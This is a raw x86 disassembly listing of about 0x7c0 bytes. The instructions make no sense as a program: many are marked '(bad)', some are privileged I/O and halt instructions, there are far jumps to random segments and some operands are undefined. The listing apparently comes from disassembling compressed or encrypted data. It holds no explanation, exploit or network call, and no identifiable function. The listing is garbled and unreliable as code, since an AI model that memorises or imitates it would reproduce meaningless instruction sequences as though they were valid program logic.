  420d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d67:	pop    ecx
  420d68:	sbb    BYTE PTR [eax+0x4ce3f3fb],cl
  420d6e:	jae    0x420d44
  420d70:	stc    
  420d71:	aad    0xec
  420d73:	pusha  
  420d74:	loop   0x420d13
  420d76:	jmp    FWORD PTR [ecx]
  420d78:	sbb    ebp,DWORD PTR [edi]
  420d7a:	jae    0x420daf
  420d7c:	or     al,0x48
  420d7e:	js     0x420dca
  420d80:	push   ebx
  420d81:	jno    0x420d16
  420d83:	in     al,dx
  420d84:	pop    ebp
  420d85:	and    BYTE PTR [ecx+0x46],cl
  420d88:	rcl    bh,1
  420d8a:	sbb    bh,BYTE PTR [esi+0x48279b59]
  420d90:	cmp    eax,0x2bd4cad0
  420d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d96:	jo     0x420df6
  420d98:	mov    ds:0xbf60f2ee,eax
  420d9d:	xor    edx,DWORD PTR [ecx+0x43]
  420da0:	xor    al,0xd3
  420da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da3:	(bad)  
  420da4:	fisub  WORD PTR [edi]
  420da6:	push   DWORD PTR [ebp+0x3e]
  420da9:	adc    al,0x96
  420dab:	icebp  
  420dac:	add    BYTE PTR [esi+0x67147d1e],cl
  420db2:	push   ds
  420db3:	pop    ebp
  420db4:	(bad)  
  420db5:	push   edx
  420db6:	add    BYTE PTR [esi],0xf4
  420db9:	(bad)  
  420dba:	pop    eax
  420dbb:	ror    BYTE PTR [edi-0x492d766c],1
  420dc1:	test   BYTE PTR [esi-0x66],dh
  420dc4:	test   eax,0x7a2085a2
  420dc9:	or     DWORD PTR [ebp-0x7c],ebx
  420dcc:	das    
  420dcd:	jmp    0x94d2:0x4d6f933f
  420dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dd5:	or     al,0x48
  420dd7:	dec    edi
  420dd8:	jnp    0x420e26
  420dda:	sar    BYTE PTR [esi+0x191d1527],1
  420de0:	daa    
  420de1:	nop
  420de2:	add    al,0xd6
  420de4:	ins    DWORD PTR es:[edi],dx
  420de5:	pop    es
  420de6:	and    BYTE PTR ds:0xe3a91f4b,dh
  420dec:	sub    cl,BYTE PTR [eax-0x7b]
  420def:	push   0x25
  420df1:	cmp    BYTE PTR [esi-0x6d],bh
  420df4:	mov    edi,0x8a3eafee
  420df9:	adc    BYTE PTR [eax],ah
  420dfb:	gs and bh,ch
  420dfe:	es dec edi
  420e00:	and    al,0x25
  420e02:	pop    eax
  420e03:	icebp  
  420e04:	mov    ebp,0x4d7ce898
  420e09:	cmp    ch,BYTE PTR [edi-0x46]
  420e0c:	push   0xffffffe8
  420e0e:	push   edx
  420e0f:	in     eax,0xc2
  420e11:	(bad)  
  420e12:	pop    edx
  420e13:	scas   al,BYTE PTR es:[edi]
  420e14:	in     al,dx
  420e15:	mov    esp,0x435a4a6a
  420e1a:	ret    
  420e1b:	xchg   ecx,eax
  420e1c:	call   0x6b4b0f69
  420e21:	out    dx,eax
  420e22:	rcl    DWORD PTR [edx-0x43fd9599],0xcf
  420e29:	sbb    al,0x91
  420e2b:	and    edi,ebx
  420e2d:	jae    0x420e68
  420e2f:	push   ecx
  420e30:	lods   al,BYTE PTR ds:[esi]
  420e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e32:	xchg   edi,eax
  420e33:	and    al,0x8e
  420e35:	aas    
  420e36:	and    eax,0xed9f347c
  420e3b:	xchg   edx,eax
  420e3c:	inc    edi
  420e3d:	pop    edi
  420e3e:	add    DWORD PTR [ebp+0x345a8931],edi
  420e44:	pop    ss
  420e45:	push   esp
  420e46:	das    
  420e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e48:	test   eax,0x6ad212d1
  420e4d:	das    
  420e4e:	or     DWORD PTR [edx-0x644926e2],ebp
  420e54:	test   DWORD PTR [edx-0x45],ecx
  420e57:	pushf  
  420e58:	mov    esp,DWORD PTR [esi-0x10]
  420e5b:	jmp    DWORD PTR [edi+0x27e14512]
  420e61:	pop    eax
  420e62:	mov    gs,WORD PTR [ecx]
  420e64:	jp     0x420e12
  420e66:	push   cs
  420e67:	out    dx,eax
  420e68:	push   cs
  420e69:	jg     0x420ea4
  420e6b:	pop    esi
  420e6c:	pop    ss
  420e6d:	ds scas al,BYTE PTR es:[edi]
  420e6f:	push   eax
  420e70:	inc    esi
  420e71:	xor    ch,BYTE PTR [edx]
  420e73:	scas   eax,DWORD PTR es:[edi]
  420e74:	add    DWORD PTR [edx+0x2d],edi
  420e77:	mov    WORD PTR [ebx+ecx*4-0x60],gs
  420e7b:	inc    esi
  420e7c:	inc    edx
  420e7d:	xchg   dh,ah
  420e7f:	mov    eax,0x32b8d0da
  420e84:	(bad)  
  420e85:	imul   edi,DWORD PTR [edx],0xf09330e3
  420e8b:	cmp    eax,0x3bb702c7
  420e90:	aaa    
  420e91:	pop    eax
  420e92:	iret   
  420e93:	push   edi
  420e94:	bound  edi,QWORD PTR [edi+ebp*8]
  420e97:	out    dx,eax
  420e98:	mov    ch,BYTE PTR [ebp+esi*8-0x1b]
  420e9c:	pop    ss
  420e9d:	lods   al,BYTE PTR ds:[esi]
  420e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e9f:	mov    ecx,0x73fad8bf
  420ea4:	test   BYTE PTR [edx-0x3f877231],0xce
  420eab:	add    dl,BYTE PTR [esi+ebp*1]
  420eae:	test   al,0x6c
  420eb0:	push   ecx
  420eb1:	xlat   BYTE PTR ds:[ebx]
  420eb2:	ficom  WORD PTR [edi-0x71]
  420eb5:	inc    esi
  420eb6:	inc    esi
  420eb7:	aad    0x44
  420eb9:	jbe    0x420ecd
  420ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ebc:	jae    0x420f22
  420ebe:	inc    ebx
  420ebf:	dec    ecx
  420ec0:	test   al,0xbd
  420ec2:	or     al,BYTE PTR [ecx+0x71b8459d]
  420ec8:	jo     0x420e63
  420eca:	je     0x420e88
  420ecc:	sub    al,0x34
  420ece:	jmp    0xbc5364bb
  420ed3:	into   
  420ed4:	retf   
  420ed5:	cdq    
  420ed6:	mov    bh,0xb6
  420ed8:	jbe    0x420f3e
  420eda:	cmp    esp,DWORD PTR [edi]
  420edc:	pop    edx
  420edd:	or     DWORD PTR [esi+0x324413bf],0x869cc036
  420ee7:	and    al,0xcc
  420ee9:	ror    ch,cl
  420eeb:	pop    edx
  420eec:	adc    cl,dh
  420eee:	add    BYTE PTR [esi+0x55f024e4],0x7e
  420ef5:	push   esp
  420ef6:	and    DWORD PTR ds:0xddf83d56,0xc4d4ebbb
  420f00:	pop    ss
  420f01:	mov    bl,0x50
  420f03:	hlt    
  420f04:	inc    esp
  420f05:	push   es
  420f06:	and    al,0xf7
  420f08:	jb     0x420ee3
  420f0a:	mov    ebx,0x75e1a364
  420f0f:	xor    eax,0xb691992e
  420f14:	iret   
  420f15:	mov    ebx,DWORD PTR [ecx+0x65]
  420f18:	cwde   
  420f19:	jg     0x420ea1
  420f1b:	rcl    DWORD PTR [ebx-0x4f3f9936],1
  420f21:	adc    al,BYTE PTR [esi-0x44c57c9e]
  420f27:	mov    ah,0x7a
  420f29:	mov    edi,0x3385c601
  420f2e:	cld    
  420f2f:	add    ebp,DWORD PTR [esi+0x76cb2119]
  420f35:	dec    edx
  420f36:	in     al,0x62
  420f38:	pmaxub mm3,QWORD PTR [ecx-0x7f]
  420f3c:	xchg   DWORD PTR [edi+0x6635ad35],ecx
  420f42:	pop    edx
  420f43:	(bad)  
  420f44:	popa   
  420f45:	mov    ds:0x1e1aeb24,eax
  420f4a:	xchg   DWORD PTR [eax-0x7d0aa665],ebx
  420f50:	mov    esi,0x997cbdf4
  420f55:	imul   ebp,esi,0x5d6b772e
  420f5b:	inc    ebx
  420f5c:	jg     0x420f3f
  420f5e:	imul   edx,ebx,0xd66d1b80
  420f64:	pushf  
  420f65:	xchg   edx,eax
  420f66:	jno    0x420efa
  420f68:	and    eax,0x791f93d4
  420f6d:	imul   DWORD PTR [ecx+0x2791c1a2]
  420f73:	(bad)  
  420f74:	imul   eax,DWORD PTR [ebp-0x56],0x87392543
  420f7b:	dec    edi
  420f7c:	fisttp QWORD PTR [edi-0x80]
  420f7f:	lods   al,BYTE PTR ds:[esi]
  420f80:	or     al,0xd9
  420f82:	scas   eax,DWORD PTR es:[edi]
  420f83:	mul    BYTE PTR [eax]
  420f85:	sbb    eax,DWORD PTR [ebx-0xb9ce64a]
  420f8b:	adc    eax,DWORD PTR [edx-0x36]
  420f8e:	mov    esi,0x924849fd
  420f93:	aaa    
  420f94:	sub    cl,BYTE PTR [ecx+edx*1+0x1034e235]
  420f9b:	adc    al,0xcb
  420f9d:	mov    edi,0x5f5eb1a1
  420fa2:	loop   0x420fe3
  420fa4:	pop    ss
  420fa5:	int    0x7e
  420fa7:	test   al,0xa2
  420fa9:	sub    BYTE PTR [ecx+0x6b],0x34
  420fad:	imul   esi,eax,0x59033e77
  420fb3:	into   
  420fb4:	add    esp,ecx
  420fb6:	mov    DWORD PTR [eax+0x29b5400a],ebp
  420fbc:	jne    0x420fc6
  420fbe:	or     eax,0x5e0c697d
  420fc3:	fwait
  420fc4:	mov    DWORD PTR [esi+0x59],ebp
  420fc7:	data16 sar BYTE PTR [eax],cl
  420fca:	adc    cl,dl
  420fcc:	cdq    
  420fcd:	pop    edi
  420fce:	adc    al,0x32
  420fd0:	fiadd  DWORD PTR ss:[eax]
  420fd3:	xchg   edx,eax
  420fd4:	aam    0x7f
  420fd6:	aad    0xa7
  420fd8:	cmp    eax,0xa89aea51
  420fdd:	pop    ds
  420fde:	(bad)  
  420fdf:	mov    dl,0x7e
  420fe1:	fwait
  420fe2:	(bad)  
  420fe3:	xchg   edi,eax
  420fe4:	jp     0x420fa1
  420fe6:	ret    0xa141
  420fe9:	sbb    al,0x60
  420feb:	daa    
  420fec:	repz or eax,0x4e1fe8b6
  420ff2:	sub    ch,BYTE PTR ds:0x401935d
  420ff8:	enter  0x65a2,0xdc
  420ffc:	sub    al,0xff
  420ffe:	sub    eax,0xa7e5d24d
  421003:	hlt    
  421004:	jns    0x421070
  421006:	and    eax,0xc265c32a
  42100b:	retf   0xc94e
  42100e:	mov    WORD PTR [ebx-0x6f],?
  421011:	cmp    ebx,DWORD PTR ss:[edx+0x588a4409]
  421018:	cdq    
  421019:	fs mov al,0x92
  42101c:	jl     0x421099
  42101e:	adc    al,0x6c
  421020:	(bad)  [ebx-0x1b]
  421023:	sbb    eax,0xa4098eee
  421029:	cdq    
  42102a:	mov    WORD PTR gs:[ecx],cs
  42102d:	icebp  
  42102e:	(bad)  
  42102f:	jge    0x420fcc
  421031:	inc    ecx
  421032:	test   DWORD PTR [esi],ecx
  421034:	pop    ebp
  421035:	xor    edx,ebx
  421037:	sub    edi,eax
  421039:	jns    0x42106d
  42103b:	jge    0x420fc0
  42103d:	clc    
  42103e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42103f:	xchg   ebx,eax
  421040:	jb     0x421062
  421042:	cmp    BYTE PTR [edi+edi*1-0x630dbd43],ah
  421049:	push   esi
  42104a:	mov    cl,0x37
  42104c:	xor    eax,0xd6623817
  421051:	mov    bl,0x45
  421053:	cdq    
  421054:	sub    al,0x6
  421056:	xchg   esi,eax
  421057:	aam    0xfb
  421059:	call   0x571f:0xf94f70a
  421060:	inc    ebp
  421061:	pusha  
  421062:	ja     0x42104e
  421064:	lock push esi
  421066:	ins    BYTE PTR es:[edi],dx
  421067:	and    DWORD PTR ss:[ebx+0x38],ebp
  42106b:	pop    edi
  42106c:	stos   BYTE PTR es:[edi],al
  42106d:	inc    edx
  42106e:	push   0x1dc9db10
  421073:	into   
  421074:	aaa    
  421075:	rcr    DWORD PTR [eax],1
  421077:	les    edi,FWORD PTR [ebx+edi*2+0x61]
  42107b:	jno    0x42108b
  42107d:	mov    eax,0xfda9d086
  421082:	stc    
  421083:	(bad)  
  421084:	jns    0x421098
  421086:	cmc    
  421087:	das    
  421088:	jbe    0x42108d
  42108a:	cld    
  42108b:	ret    0x602
  42108e:	popf   
  42108f:	cmp    al,BYTE PTR [esi+0x19]
  421092:	pop    edi
  421093:	popf   
  421094:	xor    DWORD PTR ds:0x514f9fe6,edi
  42109a:	jmp    0x421118
  42109c:	loopne 0x4210a9
  42109e:	push   0x78
  4210a0:	sbb    esi,DWORD PTR ds:0x93fea46
  4210a6:	loope  0x42105a
  4210a8:	sahf   
  4210a9:	sbb    ebx,DWORD PTR [edi+ecx*1]
  4210ac:	enter  0xe353,0xbb
  4210b0:	shr    DWORD PTR [edi+0x7d],1
  4210b3:	shr    DWORD PTR [ecx+0x35],0x3c
  4210b7:	inc    ecx
  4210b8:	adc    dh,BYTE PTR [ecx+0x4128bec2]
  4210be:	push   0xa7610c16
  4210c3:	or     DWORD PTR [ecx+ebp*8],edi
  4210c6:	jns    0x421115
  4210c8:	clc    
  4210c9:	and    eax,0x172218da
  4210ce:	add    al,0xca
  4210d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210d1:	rep ins BYTE PTR es:[edi],dx
  4210d3:	xchg   ebx,eax
  4210d4:	aaa    
  4210d5:	push   ecx
  4210d6:	sub    eax,0xceec2da9
  4210db:	ret    0x1727
  4210de:	sbb    al,0xc9
  4210e0:	adc    al,0x6
  4210e2:	sub    ecx,DWORD PTR [edx+0x3ac50e93]
  4210e8:	jp     0x4210b9
  4210ea:	push   es
  4210eb:	jae    0x4210fc
  4210ed:	ret    0xf968
  4210f0:	mov    ds:0x4a8e6aa5,eax
  4210f5:	mov    edi,0xf3a2483b
  4210fa:	outs   dx,DWORD PTR ds:[esi]
  4210fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fc:	add    bl,BYTE PTR [eax+0x2b2f3458]
  421102:	or     al,BYTE PTR [ebx]
  421104:	pop    ss
  421105:	and    bh,bl
  421107:	fisttp QWORD PTR [ecx+0x3975f570]
  42110d:	or     edi,ebx
  42110f:	call   0x9fbd:0x3f06ee5
  421116:	(bad)  
  421117:	push   ds
  421118:	fmul   QWORD PTR [ecx+0x64]
  42111b:	mov    esp,0x9a16f3ff
  421120:	mov    ss,WORD PTR [edi+0x35]
  421123:	bound  ecx,QWORD PTR [ecx+0x17]
  421126:	nop
  421127:	push   cs
  421128:	or     DWORD PTR [ecx+ebx*8+0x55d850b8],edx
  42112f:	lea    ebp,[eax-0x51]
  421132:	imul   esp,DWORD PTR [ebp+esi*1+0x5f],0xcf984729
  42113a:	dec    eax
  42113b:	dec    ebp
  42113c:	mov    cs,WORD PTR [ecx+esi*1-0x7c3d0935]
  421143:	xchg   edx,eax
  421144:	mov    al,0x9d
  421146:	aas    
  421147:	mov    edx,0xc690de40
  42114c:	scas   eax,DWORD PTR es:[edi]
  42114d:	ss ret 0x9757
  421151:	outs   dx,BYTE PTR fs:[esi]
  421153:	adc    ebx,esi
  421155:	mov    eax,0x70f43a37
  42115a:	push   0x9245b69b
  42115f:	sbb    bl,BYTE PTR [eax]
  421161:	popf   
  421162:	cmp    DWORD PTR [eax-0x40],0xffffff9b
  421166:	add    DWORD PTR [edi],edx
  421168:	pop    ds
  421169:	addr16 mov bh,0x33
  42116c:	mov    ecx,0x5c6a91db
  421171:	xchg   ecx,eax
  421172:	pop    ds
  421173:	ret    
  421174:	jg     0x4211c3
  421176:	sar    DWORD PTR [edx+0x7c3c50bd],cl
  42117c:	mov    ecx,DWORD PTR [ecx-0xa]
  42117f:	aam    0x7
  421181:	in     eax,dx
  421182:	fnstenv [edx]
  421184:	sbb    bl,ch
  421186:	dec    ecx
  421187:	ins    DWORD PTR es:[edi],dx
  421188:	inc    edx
  421189:	xchg   esp,eax
  42118a:	push   ebp
  42118b:	xadd   DWORD PTR [edi],ebx
  42118e:	cld    
  42118f:	add    edx,edx
  421191:	popf   
  421192:	push   0xffffffe6
  421194:	mov    bl,0x67
  421196:	and    DWORD PTR [ecx+0x18e8d5c6],eax
  42119c:	into   
  42119d:	sbb    edx,DWORD PTR [eax]
  42119f:	scas   al,BYTE PTR es:[edi]
  4211a0:	cdq    
  4211a1:	cmp    eax,DWORD PTR fs:[eax+0x36]
  4211a5:	lea    ebp,[edx+0x77]
  4211a8:	rol    BYTE PTR [eax+0x7018105b],0xf8
  4211af:	(bad)  
  4211b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211b1:	retf   0xccf4
  4211b4:	dec    BYTE PTR [ecx+0x483e2105]
  4211ba:	ins    DWORD PTR es:[edi],dx
  4211bb:	mov    es,WORD PTR [eax+0x7]
  4211be:	bound  ebx,QWORD PTR [edi]
  4211c0:	and    eax,0xf4c121f3
  4211c5:	popa   
  4211c6:	pop    ebp
  4211c7:	cs mov bh,0xd3
  4211ca:	es retf 0x59cd
  4211ce:	in     eax,dx
  4211cf:	jp     0x42124e
  4211d1:	lds    edi,FWORD PTR [ecx+0x7a]
  4211d4:	cmp    ebp,edi
  4211d6:	cmp    ebp,DWORD PTR [ebx-0x75]
  4211d9:	jge    0x421199
  4211db:	(bad)  
  4211dc:	ffree  st(0)
  4211de:	inc    esi
  4211df:	push   ss
  4211e0:	ret    0xc9d8
  4211e3:	ds imul eax,esp,0xffffffb7
  4211e7:	cmp    esp,0x96296099
  4211ed:	cmp    al,0x23
  4211ef:	or     al,0xaa
  4211f1:	loope  0x421182
  4211f3:	or     DWORD PTR [eax-0xf],ecx
  4211f6:	je     0x421224
  4211f8:	sar    DWORD PTR [ebx+ebp*4-0x6c77d055],0x54
  421200:	jnp    0x42122d
  421202:	push   esp
  421203:	push   es
  421204:	sub    eax,0xbf6e525
  421209:	pop    eax
  42120a:	xchg   edi,eax
  42120b:	sub    al,0x26
  42120d:	mov    dl,0x49
  42120f:	lahf   
  421210:	mov    bl,0xe3
  421212:	xchg   edx,eax
  421213:	push   ebx
  421214:	mov    bh,0xdd
  421216:	loopne 0x421219
  421218:	retf   
  421219:	xor    DWORD PTR [ecx],esp
  42121b:	mov    esi,0xb3169f31
  421220:	aaa    
  421221:	or     ebp,DWORD PTR [ebx]
  421223:	nop    DWORD PTR [esi-0x5029c0e2]
  42122a:	jnp    0x421228
  42122c:	mov    al,0x1a
  42122e:	mov    ah,0xa3
  421230:	scas   al,BYTE PTR es:[edi]
  421231:	inc    ebp
  421232:	add    al,0xb8
  421234:	cmp    cl,BYTE PTR [ecx+0x44]
  421237:	inc    ebx
  421238:	mov    cl,0xf6
  42123a:	mov    al,ds:0xe69ad499
  42123f:	call   0x93e9dedb
  421244:	mov    ds:0x4387d8ec,al
  421249:	dec    ebp
  42124a:	mov    ds:0xc864a004,al
  42124f:	lods   eax,DWORD PTR ds:[esi]
  421250:	pop    eax
  421251:	sbb    dh,dl
  421253:	push   cs
  421254:	popf   
  421255:	push   eax
  421256:	push   0xffffff98
  421258:	icebp  
  421259:	push   ebp
  42125a:	and    BYTE PTR [ecx*8+0x6cea51bd],ch
  421261:	loop   0x4212ce
  421263:	mov    ebx,eax
  421265:	clc    
  421266:	push   ecx
  421267:	mov    ebp,0x31541f4f
  42126c:	inc    edi
  42126d:	std    
  42126e:	cwde   
  42126f:	je     0x4212a8
  421271:	ja     0x4212da
  421273:	xchg   DWORD PTR [esi-0x65],edx
  421276:	jl     0x421229
  421278:	inc    eax
  421279:	clc    
  42127a:	jecxz  0x42122f
  42127c:	jne    0x4212d7
  42127e:	sbb    ch,bl
  421280:	lods   al,BYTE PTR ds:[esi]
  421281:	and    al,0x53
  421283:	std    
  421284:	push   es
  421285:	(bad)  
  421286:	aas    
  421287:	repz jnp 0x421287
  42128a:	push   cs
  42128b:	aaa    
  42128c:	ret    0xf349
  42128f:	push   0x14b9e07
  421294:	imul   ebp,DWORD PTR [edi+ebp*8],0xa
  421298:	sahf   
  421299:	mov    al,ds:0x88e4e793
  42129e:	mov    esi,DWORD PTR [eax+edi*8-0x5cb63757]
  4212a5:	out    dx,eax
  4212a6:	test   eax,0x90016c3a
  4212ab:	mov    ?,WORD PTR [edi-0x55e74fd0]
  4212b1:	mov    DWORD PTR [esi+eiz*2+0x7f],edi
  4212b5:	cli    
  4212b6:	xchg   ecx,eax
  4212b7:	cs sbb dh,ah
  4212ba:	cld    
  4212bb:	inc    ebx
  4212bc:	xchg   esp,eax
  4212bd:	dec    ecx
  4212be:	arpl   WORD PTR [edi+0x1d],si
  4212c1:	sti    
  4212c2:	sbb    edi,DWORD PTR [edi]
  4212c4:	mov    es,WORD PTR [edi]
  4212c6:	pop    ebp
  4212c7:	out    0x76,al
  4212c9:	icebp  
  4212ca:	imul   ebp,DWORD PTR [edx],0xbaff740
  4212d0:	jno    0x421268
  4212d2:	popa   
  4212d3:	rcl    bl,0xc3
  4212d6:	mov    esp,0xfadc508
  4212db:	jg     0x421292
  4212dd:	ror    DWORD PTR [ebp-0x9],1
  4212e0:	cmp    BYTE PTR ds:0xc0e8bb8d,cl
  4212e6:	fcom   DWORD PTR [edx-0xa4f78be]
  4212ec:	pop    ebx
  4212ed:	push   edi
  4212ee:	mul    DWORD PTR [ebx-0x33]
  4212f1:	pop    ebp
  4212f2:	mul    DWORD PTR [ecx]
  4212f4:	and    DWORD PTR [ebx],eax
  4212f6:	mov    ebp,DWORD PTR [eax+0x68c54b2a]
  4212fc:	or     dh,BYTE PTR [edx]
  4212fe:	or     al,0x1e
  421300:	xor    al,0xe0
  421302:	dec    ecx
  421303:	xor    BYTE PTR [eax+0xafcfb4f],dl
  421309:	fwait
  42130a:	push   0xffffffa4
  42130c:	add    DWORD PTR [ecx],ebp
  42130e:	das    
  42130f:	imul   ecx,ecx,0xffffffeb
  421312:	pop    ds
  421313:	lods   al,BYTE PTR ds:[esi]
  421314:	mov    edi,0x80e3ea0
  421319:	adc    bh,ah
  42131b:	and    al,0x3c
  42131d:	mov    BYTE PTR [ebx+0x65560e35],ch
  421323:	ss rcl ebx,cl
  421326:	test   eax,0xeb91e2f8
  42132b:	pop    edx
  42132c:	jns    0x4212f7
  42132e:	or     cl,BYTE PTR [eax-0x565ab6d0]
  421334:	mov    bl,0x62
  421336:	mov    eax,ds:0x19fdead
  42133b:	cwde   
  42133c:	ja     0x4213b9
  42133e:	and    DWORD PTR [ebp-0x20a41a64],ebp
  421344:	mov    eax,ds:0xef3bde67
  421349:	daa    
  42134a:	push   es
  42134b:	sub    eax,0x540e6238
  421350:	loopne 0x42132e
  421352:	and    DWORD PTR [eax+0x5466614b],esp
  421358:	mov    cl,bh
  42135a:	retf   0xe1bb
  42135d:	jne    0x421341
  42135f:	pop    esi
  421360:	scas   al,BYTE PTR es:[edi]
  421361:	mov    ds:0x22292839,al
  421366:	idiv   DWORD PTR [ecx]
  421368:	imul   eax,DWORD PTR [eax],0xffffffdc
  42136b:	cmp    eax,0x8c3713f9
  421370:	xchg   DWORD PTR [ebx-0x36b94c0],edi
  421376:	out    0x18,al
  421378:	lock cwde 
  42137a:	mov    edx,0x8c2ff847
  42137f:	cs jne 0x42139b
  421382:	aas    
  421383:	xchg   BYTE PTR [esi-0x3d],cl
  421386:	and    eax,ebx
  421388:	push   eax
  421389:	fiadd  WORD PTR [ecx-0xb]
  42138c:	mov    edi,0x4a24dbad
  421391:	mov    ah,0x81
  421393:	cmp    edx,DWORD PTR [esi+0x61]
  421396:	mov    ds:0x454c61b,eax
  42139b:	rcl    DWORD PTR [ecx-0x6e85046c],0x36
  4213a2:	xchg   ebx,eax
  4213a3:	add    esi,DWORD PTR [ebp-0x3665b354]
  4213a9:	daa    
  4213aa:	sub    ch,BYTE PTR [edi]
  4213ac:	or     bl,BYTE PTR [eax-0x18]
  4213af:	mov    eax,0xff461618
  4213b4:	cmp    DWORD PTR [edx],eax
  4213b6:	call   0x289a9ac1
  4213bb:	xor    BYTE PTR [ebx-0x18],dl
  4213be:	sbb    BYTE PTR [edx],0x1f
  4213c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c2:	test   BYTE PTR [ecx-0x5a],ch
  4213c5:	adc    DWORD PTR [esi+0x6c2696e8],esp
  4213cb:	pusha  
  4213cc:	aas    
  4213cd:	std    
  4213ce:	pop    ds
  4213cf:	push   DWORD PTR [esi]
  4213d1:	sbb    BYTE PTR [ebp-0x25343d0a],dl
  4213d7:	in     al,dx
  4213d8:	mov    dl,0x30
  4213da:	enter  0xad17,0xdf
  4213de:	out    dx,al
  4213df:	push   ebp
  4213e1:	xchg   DWORD PTR [eax+0x51],ebx
  4213e4:	retf   
  4213e5:	out    0x85,al
  4213e7:	mov    ecx,0xcc7e6a88
  4213ec:	dec    ebp
  4213ed:	mov    ebx,0x1f21fbb8
  4213f2:	pop    esi
  4213f3:	ret    
  4213f4:	pop    esi
  4213f5:	add    bl,BYTE PTR [eax+0x774fe69d]
  4213fb:	sbb    eax,0xdc127376
  421400:	sub    al,0x60
  421402:	aas    
  421403:	inc    edi
  421404:	(bad)  
  421405:	stc    
  421406:	mov    DWORD PTR [ebx+ebx*4+0x21],0x6848d706
  42140e:	jle    0x42142b
  421410:	xchg   esi,eax
  421411:	pushw  cs
  421413:	scas   eax,DWORD PTR es:[edi]
  421414:	retf   
  421415:	shl    BYTE PTR [esi+ebp*2],cl
  421418:	repz mov dl,0xa5
  42141b:	das    
  42141c:	xor    DWORD PTR [edi+0x16],0x34
  421420:	ins    DWORD PTR es:[edi],dx
  421421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421422:	cmp    dl,BYTE PTR [edx]
  421424:	sbb    ebx,DWORD PTR [edi-0x5045f0d6]
  42142a:	adc    dh,BYTE PTR ds:0x22f41bfd
  421430:	(bad)  
  421431:	xor    bl,dh
  421433:	sub    BYTE PTR [ebx+0x28],0x5d
  421437:	inc    ecx
  421438:	scas   eax,DWORD PTR es:[edi]
  421439:	push   ebp
  42143a:	bound  eax,QWORD PTR [ecx]
  42143c:	and    eax,0x6b79a8f5
  421441:	add    eax,0xe278888e
  421446:	cmp    DWORD PTR [ecx-0x41],esp
  421449:	dec    esi
  42144a:	mov    ds:0x6d1fadb1,al
  42144f:	jns    0x421417
  421451:	cli    
  421452:	inc    esi
  421453:	in     eax,0x4c
  421455:	xchg   edx,eax
  421456:	xchg   edi,eax
  421457:	fist   WORD PTR [edx+0x6e]
  42145a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42145b:	pushf  
  42145c:	mov    al,ds:0x8cf39fea
  421461:	xchg   DWORD PTR [ecx],ebx
  421463:	push   ebp
  421464:	inc    esi
  421465:	outs   dx,BYTE PTR ds:[esi]
  421466:	add    al,0x1b
  421468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421469:	adc    al,0x57
  42146b:	in     eax,0x88
  42146d:	test   DWORD PTR [edi-0x2d16b7fa],0x23101137
  421477:	hlt    
  421478:	cmc    
  421479:	cmp    bh,BYTE PTR [esi]
  42147b:	mov    eax,ds:0x1905657d
  421480:	in     eax,dx
  421481:	push   ds
  421482:	outs   dx,BYTE PTR ds:[esi]
  421483:	adc    al,0x3d
  421485:	je     0x4214d2
  421487:	jl     0x421475
  421489:	je     0x4214d7
  42148b:	adc    DWORD PTR [ebx],0x9ba58914
  421491:	call   0x832a8c96
  421496:	pop    esi
  421497:	ss inc ecx
  421499:	nop
  42149a:	add    al,BYTE PTR [esi]
  42149c:	mov    esp,0x13c1010
  4214a1:	je     0x42150a
  4214a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a4:	lea    edi,[eax-0x39e71f3e]
  4214aa:	aaa    
  4214ab:	shl    DWORD PTR [edi],1
  4214ad:	push   eax
  4214ae:	dec    ebx
  4214af:	pop    ebp
  4214b0:	or     ah,BYTE PTR [edx]
  4214b2:	sbb    DWORD PTR [edx],edi
  4214b4:	add    eax,0x15a6a10
  4214b9:	icebp  
  4214ba:	data16 jl 0x42145c
  4214bd:	dec    eax
  4214be:	or     DWORD PTR [ebx],0xffffffbf
  4214c1:	and    ebx,ecx
  4214c3:	mov    al,0x84
  4214c5:	and    esp,DWORD PTR [edx-0x2c]
  4214c8:	push   eax
  4214c9:	aaa    
  4214ca:	sbb    dl,BYTE PTR [ebx]
  4214cc:	mov    cs,WORD PTR [edi-0x46]
  4214cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214d0:	scas   eax,DWORD PTR es:[edi]
  4214d1:	jne    0x4214b5
  4214d3:	push   esp
  4214d4:	popa   
  4214d5:	retf   
  4214d6:	repz js 0x42154b
  4214d9:	std    
  4214da:	pop    ebp
  4214db:	mov    ah,0xf0
  4214dd:	add    BYTE PTR [esi],0xae
  4214e0:	out    dx,eax
  4214e1:	push   cs
  4214e2:	imul   esp,ecx,0x63
  4214e5:	outs   dx,DWORD PTR ds:[esi]
  4214e6:	cmp    dh,BYTE PTR [esi]
  4214e8:	in     al,0xbb
  4214ea:	sub    al,0xcd
  4214ec:	mov    al,ds:0xa87a6822
  4214f1:	mov    edx,0xec25d2b4
  4214f6:	sahf   
  4214f7:	dec    ebx
  4214f8:	cld    
  4214f9:	xor    BYTE PTR ds:0x7d2a6d0d,ah
  4214ff:	add    al,0x68
  421501:	out    0xb1,al
  421503:	jno    0x421574
  421505:	test   DWORD PTR [eax],ebp
  421507:	(bad)  
  421508:	aas    
  421509:	lds    ebx,FWORD PTR [edi-0x7d1757bf]
  42150f:	ss sub edi,ecx
  421512:	out    0xd5,al
  421514:	mov    ebx,0x74b1793f
  421519:	cld    
  42151a:	add    ebx,DWORD PTR [eax+0x61]
  42151d:	js     0x4214ef
  42151f:	mov    esp,0xbff63d0b
  421524:	mov    ah,0x47
